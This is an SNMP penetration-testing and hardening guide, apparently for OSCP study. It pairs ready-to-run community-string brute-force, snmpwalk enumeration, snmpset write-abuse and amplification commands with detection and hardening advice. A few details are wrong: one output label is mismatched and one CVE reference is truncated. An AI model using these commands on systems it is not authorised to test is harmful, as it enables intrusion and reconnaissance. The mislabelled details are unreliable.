## 1. Overview

SNMP (Simple Network Management Protocol) is used to monitor and manage
network devices (routers, switches, printers, servers, UPS, IoT).
Its security model (v1/v2c) is based on community strings - effectively
plaintext passwords. SNMPv3 adds proper authentication and encryption
but is rarely deployed.

**Core concepts:**

- **Manager** - the monitoring system that queries agents.
- **Agent** - the software on a device that responds to queries.
- **MIB (Management Information Base)** - the tree of objects exposed by
  the agent.
- **OID (Object Identifier)** - a path in the MIB tree, e.g.
  `1.3.6.1.2.1.1.1.0` (sysDescr).
- **Community string** - a shared secret in v1/v2c (default: `public`
  for read, `private` for write).
- **Trap** - an asynchronous notification from agent to manager.
- **SNMPv3** - adds USM (User-based Security Model) with authentication
  (MD5/SHA) and encryption (DES/AES).

**Ports:**

- 161/UDP - SNMP agent (queries).
- 162/UDP - SNMP trap receiver.

**Common MIB objects (start here):**

- `1.3.6.1.2.1.1.1.0` - sysDescr (system description, often reveals OS
  and version).
- `1.3.6.1.2.1.1.3.0` - sysUpTime.
- `1.3.6.1.2.1.1.4.0` - sysContact.
- `1.3.6.1.2.1.1.5.0` - sysName (hostname).
- `1.3.6.1.2.1.1.6.0` - sysLocation.
- `1.3.6.1.2.1.2.2.1.2` - ifDescr (network interfaces).
- `1.3.6.1.2.1.25.1.6.0` - hrSystemProcesses (running processes).
- `1.3.6.1.2.1.25.4.2.1.2` - hrSWRunName (installed software).
- `1.3.6.1.4.1.77.1.2.25.1.1` - Windows users.
- `1.3.6.1.4.1.77.1.2.3.1.1` - Windows shares.
- `1.3.6.1.4.1.77.1.4.1.0` - Windows domain.

## 2. Reconnaissance / Enumeration

**Offensive - scan for SNMP:**

    # UDP scan
    nmap -sU -p 161 10.10.10.0/24

    # SNMP-specific scripts
    nmap -sU -p 161 --script snmp-info 10.10.10.1
    nmap -sU -p 161 --script snmp-brute 10.10.10.1

    # Expected output (snmp-info):
    # 161/udp open  snmp
    # | snmp-info:
    # |   enterprise: cisco
    # |   engineIDFormat: mac
    # |   engineIDData: 00:1a:2b:3c:4d:5e
    # |   snmpEngineBoots: 42
    # |_  snmpEngineTime: 3 days

**Offensive - community string brute force:**

    # onesixtyone - fast brute forcer
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.1

    # Expected output:
    # 10.10.10.1 [public] Cisco IOS 15.2
    # 10.10.10.1 [private] Cisco IOS 15.2

    # nmap snmp-brute
    nmap -sU -p 161 --script snmp-brute 10.10.10.1

**Offensive - enumerate MIB with snmpwalk:**

    # Full walk (with community string "public")
    snmpwalk -v2c -c public 10.10.10.1

    # Specific OID
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.1

    # Expected output (system group):
    # SNMPv2-MIB::sysDescr.0 = STRING: Linux router 5.4.0
    # SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
    # SNMPv2-MIB::sysUpTime.0 = Timeticks: (1234567) 3:25:45.67
    # SNMPv2-MIB::sysContact.0 = STRING: admin@example.com
    # SNMPv2-MIB::sysName.0 = STRING: router01
    # SNMPv2-MIB::sysLocation.0 = STRING: Datacenter A

**Offensive - extract users, shares, processes (Windows):**

    # Windows users
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.4.1.77.1.2.25

    # Windows shares
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.4.1.77.1.2.3.1.1

    # Running processes
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2

    # Installed software
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.25.6.3.1.2

    # Network interfaces
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.2.2.1.2

    # Routing table
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.4.21

    # ARP table
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.4.22

**Offensive - write access (community string "private"):**

    # If the community string grants write access, try:
    snmpset -v2c -c private 10.10.10.1 1.3.6.1.2.1.1.5.0 s "hacked"

    # This sets sysName to "hacked".
    # If it succeeds, the agent has write access.

**Offensive - RCE via SNMP (rare, specific agents):**

    # Some SNMP agents allow command execution via specific OIDs:
    # - Cisco IOS (via specific MIBs, requires write access)
    # - net-snmp with EXEC extension (not default)
    # - HP printers (via specific OIDs)
    # See "SNMP RCE" references for details.

**Defensive - what to baseline:**

- SNMP version in use (v1/v2c should be replaced by v3).
- Community strings (should be strong, not "public"/"private").
- Read/write access scope.
- Access control lists (which hosts can query).
- Trap destinations.

## 3. Common Attack Vectors

**Community string brute force:**

- Default strings: `public`, `private`, `cisco`, `manager`, `admin`.
- Dictionary attacks with onesixtyone or nmap.
- Even one valid string reveals the entire MIB.

**MIB enumeration:**

- sysDescr reveals OS and version (patch level).
- sysContact / sysLocation reveal administrative info.
- Network interfaces reveal internal topology.
- Routing tables reveal network structure.
- ARP tables reveal hosts on the network.
- Running processes reveal installed software.
- Installed software reveals patch level and CVEs.
- User lists (Windows) reveal account names.
- Share lists (Windows) reveal network shares.

**Write access abuse:**

- If community string grants write, modify sysName, sysLocation, etc.
- In specific agents, write access can lead to code execution.

**Amplification (DDoS):**

- SNMP GETBULK with spoofed source; large response.
- Used in DDoS amplification attacks.

**Vulnerabilities in specific agents:**

- Cisco IOS SNMP RCE (CVE-2017-6742, CVE-2020- SNMP).
- Net-snmp (CVE-2014-2284, CVE-2022-24805).
- HP printers SNMP RCE.

## 4. Exploitation Recipes

**Community string brute force with onesixtyone:**

    # 1. Prepare a community string wordlist
    cat > /tmp/communities.txt <<'EOF'
    public
    private
    cisco
    manager
    admin
    snmp
    read
    write
    EOF

    # 2. Brute force
    onesixtyone -c /tmp/communities.txt 10.10.10.1

    # Expected output:
    # 10.10.10.1 [public] Linux router 5.4.0
    # 10.10.10.1 [private] Linux router 5.4.0

**SNMP enumeration with snmpwalk:**

    # 1. Basic system info
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.1

    # Expected output:
    # SNMPv2-MIB::sysDescr.0 = STRING: Linux router 5.4.0
    # SNMPv2-MIB::sysName.0 = STRING: router01
    # SNMPv2-MIB::sysLocation.0 = STRING: Datacenter A

    # 2. Network interfaces
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.2.2.1.2

    # 3. ARP table (hosts on the network)
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.4.22.1.2

    # 4. Routing table
    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.2.1.4.21.1.1

**Windows user enumeration via SNMP:**

    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.4.1.77.1.2.25.1.1

    # Expected output:
    # HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: Administrator
    # HOST-RESOURCES-MIB::hrSWRunName.2 = STRING: Guest
    # HOST-RESOURCES-MIB::hrSWRunName.3 = STRING: svc_backup

**Windows share enumeration via SNMP:**

    snmpwalk -v2c -c public 10.10.10.1 1.3.6.1.4.1.77.1.2.3.1.1

    # Expected output:
    # SNMPv2-SMI::enterprises.77.1.2.3.1.1.1 = STRING: C$
    # SNMPv2-SMI::enterprises.77.1.2.3.1.1.2 = STRING: ADMIN$
    # SNMPv2-SMI::enterprises.77.1.2.3.1.1.3 = STRING: Users
    # SNMPv2-SMI::enterprises.77.1.2.3.1.1.4 = STRING: Backup

**Write access abuse (snmpset):**

    # 1. Try to change sysName
    snmpset -v2c -c private 10.10.10.1 1.3.6.1.2.1.1.5.0 s "hacked"

    # Expected output (if write succeeds):
    # SNMPv2-MIB::sysName.0 = STRING: hacked

    # 2. Verify
    snmpget -v2c -c private 10.10.10.1 1.3.6.1.2.1.1.5.0

**SNMPv3 enumeration:**

    # SNMPv3 requires credentials (username + auth + priv)
    # With authNoPriv (authentication only):
    snmpwalk -v3 -l authNoPriv -u admin -a SHA -A <PASSWORD> 10.10.10.1

    # With authPriv (authentication + encryption):
    snmpwalk -v3 -l authPriv -u admin -a SHA -A <PASSWORD> -x AES -X <PASSWORD> 10.10.10.1

**SNMP amplification check:**

    # GETBULK with a large max-repetitions
    snmpbulkget -v2c -c public -Cn0 -Cr50 10.10.10.1 1.3.6.1.2.1
    # (Large response -> amplification potential)

## 5. Post-Exploitation

**After community string brute force:**

- Enumerate the full MIB.
- Extract system info, network topology, hosts, users, shares.
- Search for credentials in sysContact, sysLocation, or specific MIBs.
- Test write access with the same community string.

**After MIB enumeration:**

- Identify OS and patch level (sysDescr).
- Identify internal network structure (interfaces, routes, ARP).
- Identify hosts on the network (ARP).
- Identify services running (process list).
- Identify users (Windows).
- Identify shares (Windows).
- Pivot to discovered hosts.

**Cleanup (blue team):**

- Disable SNMP where not needed.
- Migrate to SNMPv3 with authPriv.
- Use strong community strings (32+ random chars).
- Restrict access to monitoring hosts only (ACL).
- Disable write access (read-only community).
- Monitor SNMP queries.

## 6. Risk Context

SNMP is a legacy protocol with a weak security model. In most
environments it is enabled for monitoring and forgotten.

**Blast radius:** a single valid community string reveals the entire
MIB - which often includes the network topology, hosts, users, shares,
and patch level. Write access can lead to device modification or (in
specific agents) code execution.

**Why attacks succeed:**

- Default community strings (`public`, `private`) are common.
- SNMPv1/v2c has no encryption or authentication.
- Access is often unrestricted (any host can query).
- Write access is often enabled (for monitoring tools).
- SNMP is rarely audited.

## 7. Root Causes

- **Default community strings.** Vendors ship with `public`/`private`.
- **No SNMPv3.** v1/v2c are still common.
- **Unrestricted access.** Any host can query.
- **Write access enabled.** Some monitoring tools require it.
- **No monitoring.** SNMP queries are not logged.
- **Legacy devices.** Old devices only support SNMPv1.

## 8. Preventive Controls

**Version hardening:**

- Migrate to SNMPv3 with authPriv (SHA-256 + AES-256).
- Disable SNMPv1 and SNMPv2c where possible.

**Community string hardening:**

- Use 32+ character random strings.
- Rotate community strings regularly.
- Never use `public` or `private`.

**Access control:**

- Restrict SNMP access to monitoring hosts (ACL).
- Use firewall rules to block SNMP from untrusted networks.
- Disable SNMP on hosts that do not need it.

**Write access:**

- Use read-only community strings.
- Never enable write access unless required.
- If write is required, use SNMPv3 with authPriv.

**Monitoring:**

- Log SNMP queries.
- Alert on community string brute force.
- Alert on unusual OIDs or query patterns.

## 9. Detection Controls

**Community string brute force:**

- Alert on high volume of SNMP queries from a single source.
- Alert on community string failures (from the agent's logs, if
  available).
- IDS/IPS signatures for SNMP brute force tools.

**MIB enumeration:**

- Alert on snmpwalk queries (high volume of OIDs).
- Alert on specific OIDs of interest (users, shares, processes).

**Write access abuse:**

- Alert on SNMP SET operations.
- Alert on sysName/sysLocation modifications.

**Amplification:**

- NetFlow: high volume of SNMP responses to a single source.
- Alert on GETBULK with large max-repetitions.

**General:**

- Forward SNMP logs to a SIEM.
- Baseline SNMP query patterns; alert on anomalies.

## 10. Verification

**Offensive - did the attack succeed?**

- Community string brute force: at least one valid string found.
- MIB enumeration: system info, network topology, users, shares
  extracted.
- Write access: SNMP SET succeeds.
- SNMPv3: credentials work (if obtained).

**Defensive - are controls effective?**

- Test community strings: only strong random strings are used.
- Test SNMPv1/v2c: disabled; only v3 with authPriv.
- Test access control: only monitoring hosts can query.
- Test write access: read-only community in use.
- Test monitoring: SNMP queries are logged and alerted.

## 11. OSCP Notes

- SNMP is a common OSCP enumeration target. Practice:
  - `onesixtyone` for community string brute force.
  - `snmpwalk` for MIB enumeration.
  - `snmp-check` for automated enumeration.
- SNMP often reveals users, processes, and network info.
- **Capture screenshots** of:
  - The community string brute force output.
  - The sysDescr and sysName.
  - Any users or shares extracted.
- The `> [!IMPORTANT]` OSCP reporting note applies to SNMP enumeration
  findings.

## 12. Production Notes

- SNMP is rarely exploited in mature environments (v3 with authPriv
  is standard).
- Legacy networks still use v1/v2c; check every device.
- Default community strings are still common in IoT devices.
- SNMP amplification is a common DDoS vector; disable GETBULK where
  possible.
- Monitor SNMP queries for unusual patterns.

## 13. References

**RFCs and documentation:**

- RFC 1157 - SNMPv1 - https://www.rfc-editor.org/rfc/rfc1157
- RFC 3411-3418 - SNMPv3 - https://www.rfc-editor.org/rfc/rfc3411
- Net-SNMP documentation - http://www.net-snmp.org/docs/
- Cisco SNMP documentation - https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/4686-snmp-intro.html

**MITRE ATT&CK:**

- Discovery - Network Service Scanning (T1046) - https://attack.mitre.org/techniques/T1046/
- Discovery - System Network Configuration Discovery (T1016) - https://attack.mitre.org/techniques/T1016/
- Impact - Network Denial of Service (T1498) - https://attack.mitre.org/techniques/T1498/

**Tools:**

- onesixtyone - https://github.com/trailofbits/onesixtyone
- snmpwalk / snmpget / snmpset / snmpbulkget - http://www.net-snmp.org/
- snmp-check - https://github.com/dheiland-r7/snmpcheck
- snmp-brute - https://nmap.org/nsedoc/scripts/snmp-brute.html (NSE)

**Research:**

- HackTricks - SNMP Pentesting - https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
- CISA - SNMP Best Practices - https://www.cisa.gov/news-events/alerts
- Cisco SNMP RCE - https://www.cisco.com/c/en/us/support/docs/security/
